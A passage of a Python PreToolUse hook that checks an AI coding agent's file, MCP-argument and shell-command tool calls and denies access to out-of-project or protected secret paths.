        get_by_key(tool_input, "file_path")
        or get_by_key(tool_input, "notebook_path")
        or get_by_key(tool_input, "path")
    )
    if not file_path:
        return None

    norm = normalize(file_path)
    allowed = is_allowed(norm)

    # allowlist only waives the project-boundary check (e.g. /tmp/**),
    # never the protected-pattern check — a secret is a secret anywhere
    if not allowed and not is_within_project(norm):
        deny(file_path, "outside_project", "path_escape")

    blocked, pattern = matches_pattern(norm)
    if blocked:
        deny(file_path, pattern, "file_path")

    logger.debug("Allowed file access: %s", file_path)
    return file_path


def _check_mcp_string_args(
    tool_input: Mapping, tool_name: str, file_path: str | None
) -> None:
    """Scan a non-allowlisted MCP tool's arbitrary string args for protected refs.

    Args:
        tool_input: The tool call's input mapping.
        tool_name: The tool name.
        file_path: The file_path resolved by _check_direct_file_access, if any.
    """
    # Non-allowlisted MCP tools with unrecognized path arg names (e.g.
    # serena's "relative_path") skip the direct-file-access check entirely
    # since it only looks at file_path/notebook_path/path — the request
    # would sail through with zero inspection otherwise. Scan every string
    # leaf in tool_input as a candidate path/content instead of relying on
    # a fixed key list, since MCP servers don't share a param-naming contract.
    if not (tool_name and tool_name.startswith("mcp__") and not file_path):
        return

    for candidate in iter_string_leaves(tool_input):
        norm = normalize(candidate)
        blocked, pattern = matches_pattern(norm)
        if blocked:
            deny(candidate, pattern, "mcp_arg")

        if not os.path.isfile(norm):
            continue
        if not is_allowed(norm) and not is_within_project(norm):
            deny(candidate, "outside_project", "mcp_path_escape")


def _check_shell_command(tool_input: Mapping) -> None:
    """Deny a Bash command that reads, copies, or exfiltrates a protected path.

    Args:
        tool_input: The tool call's input mapping.
    """
    command = get_by_key(tool_input, "command")
    if not command:
        return

    targets = extract_file_targets(command)
    targets = expand_targets(targets)

    for target in targets:
        _check_shell_command_target(command, target)


def _check_shell_command_target(command: str, target: str) -> None:
    """Deny one shell-command target that resolves to a protected path.

    Args:
        command: The raw shell command text, used only for the debug log.
        target: One file-like target extracted from command.
    """
    norm = normalize(target)
    allowed = is_allowed(norm)

    # allowlist only waives the project-boundary check (e.g. /tmp/**),
    # never the protected-pattern check — a secret is a secret anywhere
    if not allowed and not is_within_project(norm):
        deny(target, "outside_project", "command_path_escape")

    blocked, pattern = matches_pattern(norm)
    if blocked:
        deny(target, pattern, "command_read")

    logger.debug("Allowed command: %s access: %s", command, target)


def main() -> None:
    """Run the PreToolUse hook: inspect the tool call and deny protected access."""
    try:
        payload = json.load(sys.stdin)
    except json.JSONDecodeError as e:
        logger.debug("Invalid JSON: %s", e)
        sys.exit(1)

    tool_name = get_by_key(payload, "tool_name")
    tool_input = get_by_key(payload, "tool_input")

    if is_allowlisted_mcp_tool(tool_name):
        logger.debug("Allowed MCP tool (allowlisted server): %s", tool_name)
        sys.exit(0)

    if not isinstance(tool_input, Mapping):
        sys.exit(0)
    tool_name = str(tool_name) if tool_name is not None else ""

    file_path = _check_direct_file_access(tool_input)
    if file_path:
        _check_write_content(tool_input, tool_name, file_path)
    _check_mcp_string_args(tool_input, tool_name, file_path)
    _check_shell_command(tool_input)

    sys.exit(0)


if __name__ == "__main__":
    main()
